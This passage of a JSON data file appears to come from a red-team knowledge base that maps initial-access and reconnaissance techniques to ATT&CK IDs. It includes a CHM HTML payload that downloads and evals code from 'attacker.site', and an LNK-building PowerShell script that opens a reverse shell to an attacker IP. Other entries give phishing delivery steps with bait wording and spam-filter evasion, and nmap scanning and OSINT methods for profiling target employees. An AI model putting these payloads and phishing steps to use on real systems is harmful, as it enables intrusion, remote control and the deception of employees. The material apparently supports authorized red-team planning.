                "results": [
                    "WIFI CRACK:PASSWORD:CRACKED"
                ]
            }
        ]
    },
    {
        "id": "98e8b34c-4b74-425f-a69e-34731f9268a4",
        "name": "CHM",
        "phase": "01. Initial Access",
        "ttp": "T1218.001",
        "external": true,
        "description": "CHM file containing a custom JavaScript backdoor",
        "content": "# CHM files with JS\nMicrosoft Compiled HTML Help (CHM) is a Microsoft online help format, consisting of a collection of HTML pages and navigation tools, compressed in a binary format with the extension CHM. When programmically downloaded CHM files do not have to be \"unblocked\" to be executed.\n\n[blogpost](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)\n\nHTML file which needs to be added to the CHM file\n```html\n<!DOCTYPE html><html><head><title>Click Me</title><head></head><body>\nPoC ! <br>\n<OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1>\n<PARAM name=\"Command\" value=\"ShortCut\">\n<PARAM name=\"Button\" value=\"Bitmap::shortcut\">\n<PARAM name=\"Item1\" value=',rundll32.exe,javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://attacker.site/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}'>\n<PARAM name=\"Item2\" value=\"273,1,1\">\n</OBJECT>\n<SCRIPT>\nx.Click();\n</SCRIPT>\n</body></html>\n```\n\nThe CHM files can be automatically create via [creating Compiled HTML Help file](https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1)\n\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "16b200f4-00cd-44d6-b6b9-1441f0b3ef45",
                "name": "Create Malicious HTML File",
                "description": "Design an HTML file containing JavaScript code to execute a backdoor or payload.",
                "requirements": {},
                "results": [
                    "CHM:HTML:CREATED"
                ]
            },
            {
                "id": "8539e959-0805-4df3-a634-89ebecbe558b",
                "name": "Compile CHM File",
                "description": "Use tools like Out-CHM.ps1 to compile the HTML file into a CHM (Compiled HTML Help) file.",
                "requirements": {},
                "results": [
                    "CHM:FILE:COMPILED"
                ]
            },
            {
                "id": "382e4e44-d7d8-4fa4-95da-2b7a8ef4ec0a",
                "name": "Deploy CHM File",
                "description": "Distribute the CHM file to the target system for execution.",
                "requirements": {},
                "results": [
                    "CHM:FILE:DEPLOYED"
                ]
            },
            {
                "id": "afa44e86-d46c-46d1-92e5-354ebdf48943",
                "name": "Validate CHM Execution",
                "description": "Run the CHM file in a controlled environment to confirm that the payload executes as intended.",
                "requirements": {},
                "results": [
                    "CHM:EXECUTION:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "cb0837ac-4fa4-49ae-b07a-5cb94060b08a",
        "name": "HTA",
        "phase": "01. Initial Access",
        "ttp": "T1218.005",
        "external": true,
        "description": "HTA executing JS or VBScript",
        "content": "# HTA\nAn HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer (VBScript and JScript).\nAn HTA executes without the constraints of the browser's security model, so it executes as a \"fully trusted\" application.\nAn HTA is executed using `mshta.exe`, which is typically installed along with IE. In fact, `mshta` is dependent on IE, so if it has been uninstalled, HTAs will be unable to execute.\n\nBy default x32 version will be called\nCannot be send via Email. Use second stage (link,zip,iso) delivery method.\n\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "b7110671-3737-491e-85b8-a34aa8b2fbfd",
                "name": "Create Malicious HTA File",
                "description": "Design an HTA file containing VBScript or JavaScript to execute a backdoor or payload.",
                "requirements": {},
                "results": [
                    "HTA:FILE:CREATED"
                ]
            },
            {
                "id": "dd956445-3a74-4b3c-bd59-4aed65611754",
                "name": "Host HTA File on Web Server",
                "description": "Deploy the HTA file on a publicly accessible web server for delivery to the target system.",
                "requirements": {},
                "results": [
                    "HTA:FILE:HOSTED"
                ]
            },
            {
                "id": "ca6c0c52-29c0-475d-8366-b35140473eb0",
                "name": "Trigger HTA Execution",
                "description": "Use a second-stage delivery method (e.g., a link or an ISO) to prompt execution of the HTA file.",
                "requirements": {},
                "results": [
                    "HTA:EXECUTION:TRIGGERED"
                ]
            },
            {
                "id": "f02a0bc6-9403-48f3-bcaa-56b547d6f98b",
                "name": "Validate HTA Execution",
                "description": "Run the HTA file in a controlled environment to confirm that the payload executes as intended.",
                "requirements": {},
                "results": [
                    "HTA:EXECUTION:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "3ee71eb9-466f-4165-9545-78720271c26d",
        "name": "IQY",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "IQY (Web Query) Excel files",
        "content": "# IQY\nWeb Query (IQC) files are associated with Microsoft Excel.\nWeb queries allow you to query data from a specific World Wide Web, Internet, or intranet site and retrieve the information directly into a Microsoft Excel worksheet\n\n## Sample\n```text\nWEB 1 http://SERVER/[\"a\",\"Please Enter Your Password\"]\n```\n\n## References\n[source](http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html)\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "68577038-6ef5-4517-994b-481ae015df00",
                "name": "Create Malicious IQY File",
                "description": "Write an IQY file configured to query a malicious web server for payload execution.",
                "requirements": {},
                "results": [
                    "IQY:FILE:CREATED"
                ]
            },
            {
                "id": "1d81a167-dcfb-4587-95b5-48fa6d9a7fa1",
                "name": "Host IQY File on Web Server",
                "description": "Deploy the IQY file on a web server, ensuring it retrieves malicious data upon execution.",
                "requirements": {},
                "results": [
                    "IQY:FILE:HOSTED"
                ]
            },
            {
                "id": "05bea706-98df-42ff-9533-1c5c7b2ce218",
                "name": "Deliver IQY File to Target",
                "description": "Send the IQY file to the target via phishing emails or other delivery mechanisms.",
                "requirements": {},
                "results": [
                    "IQY:FILE:DELIVERED"
                ]
            },
            {
                "id": "eea0a82a-064b-4ac0-af5f-b81703f2aef7",
                "name": "Validate IQY Execution",
                "description": "Open the IQY file in Excel to verify that it retrieves the malicious content as expected.",
                "requirements": {},
                "results": [
                    "IQY:EXECUTION:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "f5f9de12-9647-4782-8a56-51c8e90be3ee",
        "name": "LNK",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "LNK (Shell Link file) remotly/localy executing code",
        "content": "# LNK\nAccording to Microsoft\u2019s documentation on [MS-SHLLINK]: Shell Link (.LNK) Binary File Format, in this format a structure is called a shell link, or shortcut, and is a data object that contains information that can be used to access another data object.\nWe can craft LNK files that reference useful target files such as cmd.exe or PowerShell. There is a restriction for 260 symbols in summary for LNK files when standard Windows properties form is used.\n\nA relatively stealthy social engineering attack would be sending a crafted LNK file embedded as an OLE object in a Word Document.\n\n## Create LNK file\nWith rev-shell via tcp\n\n```powershell\n$WshShell = New-Object -comObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"c:\\lnk_tests\\payload.lnk\")\n$Shortcut.TargetPath = \"%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n$Shortcut.IconLocation = \"%SystemRoot%\\System32\\Shell32.dll,21\"\n$Shortcut.Arguments = '-windowstyle hidden /c $sm=(New-Object Net.Sockets.TCPClient(\"attacker IP\",55555)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} '\n$Shortcut.Save()\n```\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "44494f1a-bd30-4277-ad70-671eb5cc30eb",
                "name": "Generate Reverse Shell LNK File",
                "description": "Use PowerShell's WScript.Shell COM object to create a shortcut file. Configure the TargetPath to point to PowerShell or CMD, and set the Arguments field to establish a reverse shell. Example: '-windowstyle hidden /c $sm=(New-Object Net.Sockets.TCPClient(\"attacker IP\",55555)).GetStream();'.",
                "requirements": {},
                "results": [
                    "LNK:REVERSE SHELL:GENERATED"
                ]
            },
            {
                "id": "657462d8-4300-403b-a5c8-76f4184c26fe",
                "name": "Customize LNK Properties",
                "description": "Modify LNK file attributes such as icon, description, and working directory. Set IconLocation to a legitimate DLL or EXE to reduce suspicion, e.g., 'Shell32.dll,21'.",
                "requirements": {},
                "results": [
                    "LNK:PROPERTIES:CUSTOMIZED"
                ]
            },
            {
                "id": "0c092471-e7fd-482a-956a-b20ff152d7d2",
                "name": "Embed LNK File in Social Engineering Document",
                "description": "Embed the malicious LNK file in a Word or PowerPoint document using OLE embedding. Ensure the document appears legitimate, e.g., a company report or announcement.",
                "requirements": {},
                "results": [
                    "LNK:FILE:EMBEDDED"
                ]
            },
            {
                "id": "462bed30-04ec-45cb-87d0-4719dc9dca32",
                "name": "Deliver LNK File via Phishing",
                "description": "Use a phishing email with a convincing message and the document as an attachment. Example: 'Please review the attached report and provide your feedback by EOD'.",
                "requirements": {},
                "results": [
                    "LNK:DELIVERY:COMPLETED"
                ]
            },
            {
                "id": "d75cffc0-ee26-4b93-9c26-e98c96fc8777",
                "name": "Validate LNK File Execution",
                "description": "Open the LNK file in a controlled environment. Verify that it establishes a reverse shell connection to the configured command and control server.",
                "requirements": {},
                "results": [
                    "LNK:EXECUTION:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "f5c6e064-3895-42ae-a617-90f735f87514",
        "name": "MSG",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "MSG (email) file containing emails with embedded attachements",
        "content": "# MSG\nMSG file is a file format for storing Microsoft Outlook and Exchange message files. There have been attacks that leveraged this extension combined with embedded OLE objects to bypass corporate email defenses.\n[source 1](https://medium.com/@networksecurity/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0)\n[source 2](https://www.trustwave.com/Resources/SpiderLabs-Blog/Down-the-Rabbit-Hole--Extracting-Maliciousness-from-MSG-Files-Without-Outlook/)\n\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "c7bc4b63-82f8-4138-9ef2-2335d994b30d",
                "name": "Create Malicious MSG File with Embedded OLE",
                "description": "Craft an MSG file using Outlook or specialized tools. Embed OLE objects pointing to malicious files or URLs, e.g., 'http://malicious-server/payload.exe'.",
                "requirements": {},
                "results": [
                    "MSG:FILE:WITH OLE CREATED"
                ]
            },
            {
                "id": "a615f75a-1485-46f5-9c42-63ae56b35681",
                "name": "Design Phishing Email Content",
                "description": "Write a phishing email with contextually relevant content. Example: 'Please see the attached invoice for your recent order.' Ensure the email sender appears trustworthy.",
                "requirements": {},
                "results": [
                    "MSG:PHISHING CONTENT:DESIGNED"
                ]
            },
            {
                "id": "64d2f5ab-d013-427b-9295-b4d29eb8045e",
                "name": "Send MSG File with Phishing Email",
                "description": "Use a spoofed email address or compromised account to deliver the MSG file. Ensure the email bypasses spam filters by avoiding common phishing triggers.",
                "requirements": {},
                "results": [
                    "MSG:DELIVERY:COMPLETED"
                ]
            },
            {
                "id": "ad236678-ce6e-4a0e-a727-974d2caaf74a",
                "name": "Validate MSG File Behavior",
                "description": "Open the MSG file in a sandbox or test environment. Verify that the embedded OLE object executes the linked payload or performs the intended action.",
                "requirements": {},
                "results": [
                    "MSG:BEHAVIOR:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "2ec8cae8-6273-4ad7-93e6-777648bf477b",
        "name": "Active Reconnaissance",
        "phase": "02. Reconnaissance",
        "ttp": "T1595",
        "external": true,
        "description": "Probing infrastructure and people , banner grabbing, web bugs.",
        "content": "# Active Reconnaissance\nIts alternative is the [[Passive Reconnaissance]]\n\n\ntools\n* o365: autodiscover.mdsec.co.uk/autodiscover/autodiscover.xml\n* email security: [spoofcheck](https://github.com/BishopFox/spoofcheck)\n* username: [namemash](https://gist.github.com/superkojiman/11076951), [[Cewl]]\n* scanning: [[EyeWitness]], [[MASSCAN]], [[MFAsweep]]\n* password spraying: [[LyncSniper]], [[MailSniper]], [[ruler]], [[SprayingToolkit]]\n* spear phishing: lambda web bugs, [[Responder]]\n  \nInformation you can use for [[Phishing]]\n* use id for spear phishing\n* take a look at the useragent\n* referer\n* domain, computer\n  \npreperation\n* OS (amsi?)\n* x32/x64 - shellcode/injection\n* version .net framework, DotNet2JS?\n* Microsoft Office 2016 - OLE, Protected View\n\n## Tools\n########\n########",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "f7324ef5-5a66-4f63-89eb-a7b75f5bfaed",
                "name": "Perform Subdomain Enumeration",
                "description": "Use tools like Amass or Sublist3r to enumerate subdomains of the target domain. Verify DNS records and identify potential attack vectors.",
                "requirements": {},
                "results": [
                    "ACTIVE RECON:SUBDOMAINS:ENUMERATED"
                ]
            },
            {
                "id": "16550c0a-368f-4e57-895f-ff9728152a65",
                "name": "Conduct Banner Grabbing",
                "description": "Leverage tools like Netcat or NMAP to grab service banners from open ports. Analyze the banners for software versions and vulnerabilities.",
                "requirements": {},
                "results": [
                    "ACTIVE RECON:BANNERS:GRABBED"
                ]
            },
            {
                "id": "f2848f24-973c-4850-8caa-f1edf95b23e6",
                "name": "Probe Email and Security Configurations",
                "description": "Test email spoofing protections using tools like SpoofCheck. Analyze SPF, DKIM, and DMARC records for misconfigurations.",
                "requirements": {},
                "results": [
                    "ACTIVE RECON:EMAIL CONFIG:ANALYZED"
                ]
            },
            {
                "id": "6607f908-3d7c-46fa-81a3-93103f4eb17a",
                "name": "Deploy Web Bugs for Tracking",
                "description": "Insert tracking web bugs in email or website communications to gather information on user agents, IP addresses, and network details.",
                "requirements": {},
                "results": [
                    "ACTIVE RECON:WEB BUGS:DEPLOYED"
                ]
            }
        ]
    },
    {
        "id": "14f62892-4701-4be0-aca8-d2ca3b2f2f0d",
        "name": "Exposed Machines Identification",
        "phase": "02. Reconnaissance",
        "ttp": "T1595",
        "external": true,
        "description": "Identify services within the network",
        "content": "# Exposed Machines \n\n\n\nUse [[NMAP]] and [[Nessus]] in order to detect the following exposed machines\n\n* Database Server\n* Email Server\n* SSH Server\n* VPN Server\n* Web Server\n\n\n## Tools\n########\n########\n\n## [[Amass]]\nScan for external machines\n\n## [[LyncSniper]]\n\n\n## [[NMAP]]\n[[Domain Computers]]\n* Ping Scan  \n> nmap -sP -p <ip>\n* Search smb vuln  \n> nmap -PN --script smb-vuln* -p139,445 <ip>\n* Classic Scan  \n> nmap -PN -sC -sV <ip>\n* Full Scan  \n>nmap -PN -sC -sV -p- <ip>\n* UDP Scan  \n>nmap -sU -sC -sV <ip>",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "NMAP",
            "LyncSniper",
            "Amass",
            "Nessus"
        ],
        "steps": [
            {
                "id": "792f31e0-ab63-4925-97de-84b8540e62f4",
                "name": "Perform Network Discovery with NMAP",
                "description": "Run NMAP to discover devices on the target network. Use commands such as 'nmap -sP <IP range>' to identify active hosts.",
                "requirements": {},
                "results": [
                    "EXPOSED MACHINES:NMAP:DISCOVERED"
                ]
            },
            {
                "id": "f4628f36-12be-4452-a7f6-0fa9e4e7ea52",
                "name": "Scan for Vulnerabilities",
                "description": "Conduct vulnerability scans using tools like Nessus or NMAP scripts (e.g., smb-vuln*). Identify weak points in services like SMB, SSH, or HTTP.",
                "requirements": {},
                "results": [
                    "EXPOSED MACHINES:VULNERABILITIES:IDENTIFIED"
                ]
            },
            {
                "id": "8d50dd9d-9dbe-4f51-9661-d3777800b09c",
                "name": "Analyze Service Configurations",
                "description": "Review exposed services such as database servers, email servers, or VPNs for misconfigurations and potential exploitation paths.",
                "requirements": {},
                "results": [
                    "EXPOSED MACHINES:SERVICE CONFIG:ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "fc9f5e77-ac7e-4792-b3be-793699cd8a81",
        "name": "Leaked Files Gathering",
        "phase": "02. Reconnaissance",
        "ttp": "T1597",
        "external": true,
        "description": "Identify files on the internet which can be used for information gathering and for metadata analysis",
        "content": "## Tools\n########\n########\n\n## [[Metagoofil]]\n[[Metadata]]",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Metagoofil"
        ],
        "steps": [
            {
                "id": "ce6d441b-b249-44d9-a224-4d2bcba45213",
                "name": "Search for Publicly Accessible Files",
                "description": "Identify publicly accessible files on the internet using advanced search queries. Target file types such as PDFs, DOCXs, and spreadsheets that may contain sensitive information.",
                "requirements": {},
                "results": [
                    "LEAKED FILES:GATHERED"
                ]
            },
            {
                "id": "c707d29f-717b-4819-9905-4695118f2adf",
                "name": "Analyze File Metadata",
                "description": "Extract metadata from the identified files to gather details such as usernames, email addresses, and document creation dates. Review this information for actionable intelligence.",
                "requirements": {},
                "results": [
                    "LEAKED FILES:METADATA ANALYZED"
                ]
            },
            {
                "id": "e9bc5402-e034-4592-a1fd-3b00f5a26e34",
                "name": "Organize Extracted Information",
                "description": "Consolidate the gathered information into a structured format for further analysis. Ensure relevant data is mapped to its source file.",
                "requirements": {},
                "results": [
                    "LEAKED FILES:DATA ORGANIZED"
                ]
            }
        ]
    },
    {
        "id": "6cb8f07d-7217-45fd-a91a-d0db966d78b4",
        "name": "Metadata Gathering",
        "phase": "02. Reconnaissance",
        "ttp": "T1594",
        "external": true,
        "description": "Identify metadata within files in order to identify usernames, IPs etc.",
        "content": "## Tools\n########\n########\n\n## [[FOCA]]\nDownload [here](https://github.com/ElevenPaths/FOCA/releases)",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Metagoofil",
            "FOCA"
        ],
        "steps": [
            {
                "id": "6d578afa-cc37-4603-892b-fac4d4fad393",
                "name": "Identify Files with Rich Metadata",
                "description": "Scan for files in public repositories or websites likely to contain detailed metadata. Examples include engineering documents, legal templates, or archived emails.",
                "requirements": {},
                "results": [
                    "METADATA:FILES IDENTIFIED"
                ]
            },
            {
                "id": "f3b39d64-dc15-42d8-bbd6-9e5e1269ea2b",
                "name": "Extract Metadata for Analysis",
                "description": "Analyze the files for metadata such as creator names, IP addresses, and embedded URLs. Leverage techniques such as document property inspection and hex editing.",
                "requirements": {},
                "results": [
                    "METADATA:EXTRACTED"
                ]
            },
            {
                "id": "db525f8a-ba94-47de-9526-9ba0104ee4cf",
                "name": "Correlate Metadata with Target Information",
                "description": "Cross-reference metadata findings with known target information to identify potential links. Look for patterns such as username conventions or frequently referenced domains.",
                "requirements": {},
                "results": [
                    "METADATA:CORRELATED"
                ]
            }
        ]
    },
    {
        "id": "dc347925-82ac-4fb4-8e76-3e05ef81059f",
        "name": "Passive Reconnaissance",
        "phase": "02. Reconnaissance",
        "ttp": "T1592",
        "external": true,
        "description": "Identify publicly available services",
        "content": "# Passive Reconnaissance\nIts alternative is the [[Active Reconnaissance]]\n\nNot directly interacting with the target its infrastrucutre or people\n* domain, hostnames, dns records\n```\ndig evil.corp +short\nwhois 104.21.1.132\n```\n* subnets, address ranges and IPs\n* exposed web applications and logon portals\n* employee social media\n```\nsite:\"linkedin.com\" \"<company name>\"\n```\n* employee e-mail addresses\n* credentials in public breaches\n* publicly available documents\n* job / skill descriptions (which EDR / AV etc.)\n  \nTools\n* general: [[Spiderfoot]], [[recon-ng]]\n* dns: [[Amass]], [[dnsrecon]], [[sublist3r]], [dnscan](https://github.com/rbsec/dnscan)\n* subnet: [ipv4info](http://ipv4info.com/), [shodan](https://www.shodan.corp/), [whois](https://who.is/), [censys](https://search.censys.corp/), [dnsdumpster](https://dnsdumpster.com/) (in sublist3r)\n* people: [[linedInt]], [[theHarvester]], [[Prowl]], [[Raven]], [hunter.corp](https://hunter.corp/)\n* credentials: [haveIBeenPwned](https://haveibeenpwned.com/), public breaches\n* metadata: [[FOCA]], [[Metagoofil]]\n\n\n## Tools\n########\n########\n\n## [[Collector]]\nhttps://github.com/thewhiteh4t/FinalRecon\n\n## [[FinalRecon]]\n```sh\npython3 finalrecon.py -h\nusage: finalrecon.py [-h] [--headers] [--sslinfo] [--whois] [--crawl] [--full]\n                     url\n\nFinalRecon - OSINT Tool for All-In-One Web Recon | v1.0.0\n\npositional arguments:\n  url         Target URL\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --headers   Get Header Information\n  --sslinfo   Get SSL Certificate Information\n  --whois     Get Whois Lookup\n  --crawl     Crawl Target Website\n  --full      Get Full Analysis, Test All Available Options\n\n# Check headers\npython3 finalrecon.py --headers <url>\n\n# Check ssl Certificate\npython3 finalrecon.py --sslinfo <url>\n\n# Check whois Information\npython3 finalrecon.py --whois <url>\n\n# Crawl Target\npython3 finalrecon.py --crawl <url>\n\n# full scan\npython3 finalrecon.py --full <url>\n```\n\n## [[recon-ng]]\n\n\n## [[Spiderfoot]]\n",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Spiderfoot",
            "recon-ng",
            "FinalRecon",
            "Collector"
        ],
        "steps": [
            {
                "id": "304a3378-666d-4da1-a670-445f89d4150a",
                "name": "Enumerate Public DNS Records",
                "description": "Query DNS records using domain names to identify A, MX, and TXT entries. Gather subdomains, email routing details, and security configurations such as SPF and DMARC.",
                "requirements": {},
                "results": [
                    "PASSIVE RECON:DNS:ENUMERATED"
                ]
            },
            {
                "id": "f092bc86-8173-49ba-bb20-e983d21e623f",
                "name": "Identify Publicly Exposed Assets",
                "description": "Scan for exposed web applications, login portals, and other accessible services using publicly available resources.",
                "requirements": {},
                "results": [
                    "PASSIVE RECON:ASSETS:IDENTIFIED"
                ]
            },
            {
                "id": "797d008b-99d7-4052-a69e-670d9f4029e0",
                "name": "Investigate Employee Social Media Profiles",
                "description": "Search for employee profiles on social media platforms to gather email addresses, skillsets, and software usage details.",
                "requirements": {},
                "results": [
                    "PASSIVE RECON:EMPLOYEE DATA:COLLECTED"
                ]
            },
            {
                "id": "07acae6e-a1c1-4f52-aa75-f13adf998b64",
                "name": "Analyze Job Descriptions",
                "description": "Review job postings to identify the technologies, EDR/AV systems, and software frameworks used by the target organization.",
                "requirements": {},
                "results": [
                    "PASSIVE RECON:TECHNOLOGY INFO:ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "be1c0f32-c79b-40f8-ad56-05fb7dd1cfad",
        "name": "Contact Details Gathering",
        "phase": "02. Reconnaissance",
        "ttp": "T1589",
        "external": true,
        "description": "Identify employees contact details",
        "content": "## Tools\n########\n########\n\n## [[Prowl]]\n\n\n## [[theHarvester]]\n[[IPs/Domains]] [[IP Ranges]]",
        "category": "Employee",
        "stealthy": false,
        "changes": [],
        "tools": [
            "theHarvester",
            "Prowl"
        ],
        "steps": [
            {
                "id": "f380a0d3-8e6d-4bf8-b4b8-f833ec6540fb",
                "name": "Collect Employee Email Addresses",
                "description": "Gather email addresses from public sources such as company websites, social media platforms, and third-party services.",
                "requirements": {},
                "results": [
                    "CONTACT DETAILS:EMAILS:COLLECTED"
                ]
            },
            {
                "id": "5617505c-ee42-4cfd-83d6-e214b4760988",
                "name": "Extract Contact Details from Public Breaches",
                "description": "Analyze public data breaches for contact details related to the target organization. Cross-check leaked credentials to identify valid email formats.",
                "requirements": {},
                "results": [
                    "CONTACT DETAILS:BREACH INFO:EXTRACTED"
                ]
            },
            {
                "id": "46533c0e-2b77-46f6-a236-2d5f68ad91bc",
                "name": "Analyze Social Media Connections",
                "description": "Inspect professional connections and group memberships on platforms like LinkedIn to expand contact networks.",
                "requirements": {},
                "results": [
                    "CONTACT DETAILS:SOCIAL DATA:ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "3d01c8aa-e4eb-4d8f-961b-03b66cd682c7",
        "name": "LinkedIn Gathering",
        "phase": "02. Reconnaissance",
        "ttp": "T1593.001",
        "external": true,
        "description": "Identify employees based on LinkedIn",
        "content": "## Tools\n########\n########\n\n## [[linedInt]]\n\n\n## [[Raven]]\n",
        "category": "Employee",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Raven",
            "linedInt"
        ],
        "steps": [
            {
                "id": "24ddb6e3-7497-4dee-892e-d6252f95bfda",
                "name": "Search LinkedIn for Employees",
                "description": "Use advanced search operators to identify employees working for the target organization. For example, search 'site:linkedin.com <company name>' to list profiles.",
                "requirements": {},
                "results": [
                    "LINKEDIN:EMPLOYEES IDENTIFIED"
                ]
            },
            {
                "id": "63dd2f51-c43e-4cd9-a270-7a4f60327256",
                "name": "Extract Publicly Available Information",
                "description": "Analyze profiles for job roles, technologies, and professional connections. Document patterns in email formats or department structures.",
                "requirements": {},
                "results": [
                    "LINKEDIN:DATA EXTRACTED"
                ]
            },
            {
                "id": "f5df6753-352b-497e-8715-74467f8857bb",
                "name": "Validate Gathered Information",
                "description": "Cross-reference LinkedIn data with other publicly available sources to confirm accuracy and identify anomalies.",
                "requirements": {},
                "results": [
                    "LINKEDIN:DATA VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "13ce4a1a-f645-4f6d-b168-9009237e4dbb",
        "name": "Certificate Gathering Online",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.003",
        "external": true,
        "description": "Identify services and URLs through public certificates and certificate authorities",
        "content": "# Certificates\n\n## Tools\n########\n########",
        "category": "IPs",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ForgeCert"
        ],
        "steps": [
            {
                "id": "507fa949-4e59-45e4-908d-8e735d2691ce",
                "name": "Query Certificate Transparency Logs",
                "description": "Access certificate transparency logs to identify domains and subdomains registered by the target organization.",
                "requirements": {},
                "results": [
                    "CERTIFICATES:DOMAINS IDENTIFIED"
                ]
            },
            {
                "id": "d224dc0d-fb86-4fdb-90b3-d2e5c9f032cd",
                "name": "Analyze Publicly Available Certificates",
                "description": "Review SSL/TLS certificates for technical details such as expiration dates, issuing CAs, and subject alternative names.",
                "requirements": {},
                "results": [
                    "CERTIFICATES:ANALYZED"
                ]
            },
            {
                "id": "285b6fb5-6e53-4d99-b08b-f8814c633293",
                "name": "Correlate Certificates with Services",
                "description": "Cross-reference certificate data with publicly exposed services to map domains to infrastructure.",
                "requirements": {},
                "results": [
                    "CERTIFICATES:SERVICES MAPPED"
                ]
            }
        ]
    },
    {
        "id": "27de647c-9ac7-4e12-87dc-f0ff814a20f6",
        "name": "DNS Gathering",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.001",
        "external": true,
        "description": "Identify services and URLs through DNS",
        "content": "# DNS\n\n## Tools\n########\n########\n\n## [[dnsrecon]]\nEnumerate DNS",
        "category": "IPs",
        "stealthy": false,
        "changes": [],
        "tools": [
            "dnsrecon"
        ],
        "steps": [
            {
                "id": "92627c47-a499-4a49-9a7f-bc6687d6ec13",
                "name": "Enumerate DNS Records",
                "description": "Query DNS servers to gather details such as A, AAAA, MX, CNAME, and TXT records. Analyze records for potential subdomains, email servers, and security configurations.",
                "requirements": {},
                "results": [
                    "DNS:GATHERED"
                ]
            },
            {
                "id": "0df44416-3ff8-472f-87ff-26769e953740",
                "name": "Perform Zone Transfer Tests",
                "description": "Test for misconfigured DNS servers allowing zone transfers. Attempt to retrieve entire zone files containing domain data.",
                "requirements": {},
                "results": [
                    "DNS:ZONE TRANSFER:TESTED"
                ]
            },
            {
                "id": "3e378b0a-f595-4c83-9a1b-586286a3f510",
                "name": "Map Subdomains",
                "description": "Identify subdomains linked to the target domain by analyzing DNS records. Correlate findings with publicly accessible services.",
                "requirements": {},
                "results": [
                    "DNS:SUBDOMAINS:MAPPED"
                ]
            }
        ]
    },
    {
        "id": "1644e4bf-c05d-42d9-865b-98411ded47e5",
        "name": "Domain Gathering",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.002",
        "external": true,
        "description": "Identify services and URLs Domains",
        "content": "# Domains\n\n## Tools\n########\n########",
        "category": "IPs",
        "stealthy": false,
        "changes": [],
        "tools": [
            "sublist3r",
            "theHarvester"
        ],
        "steps": [
            {
                "id": "ab2f56dc-91f3-4a1d-8537-abe58b590f48",
                "name": "Identify Domains via WHOIS Records",
                "description": "Search WHOIS databases to identify domains registered by the target organization. Extract registration details such as registrant names and contact information.",
                "requirements": {},
                "results": [
                    "DOMAIN:GATHERED"
                ]
            },
            {
                "id": "e5cf06c1-bd04-4bd9-8d45-40044b59eb1b",
                "name": "Enumerate Subdomains",
                "description": "Use DNS queries to list subdomains under identified domains. Cross-reference with other sources to validate their existence.",
                "requirements": {},
                "results": [
                    "DOMAIN:SUBDOMAINS:ENUMERATED"
                ]
            },
            {
                "id": "bef7bdcd-04e3-4bb7-992d-ecd1abddfe3b",
                "name": "Analyze Historical Domain Data",
                "description": "Access archived DNS records and WHOIS history to identify previously registered domains linked to the target.",
                "requirements": {},
                "results": [
                    "DOMAIN:HISTORY:ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "c37c32a4-4c76-4f17-8556-733f44c02629",
        "name": "IP Ranges",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.002",
        "external": true,
        "description": "Identify services and URLs through IP-Ranges",
        "content": "# IP Ranges\n\n## Tools\n########\n########\n\n## [[MASSCAN]]\n",
        "category": "IPs",
        "stealthy": false,
        "changes": [],
        "tools": [
            "MASSCAN",
            "theHarvester",
            "NMAP",
            "Nessus"
        ],
        "steps": [
            {
                "id": "67baf0c1-eb3c-49cb-ae9a-81524ee4240d",
                "name": "Identify IP Ranges from Public Records",
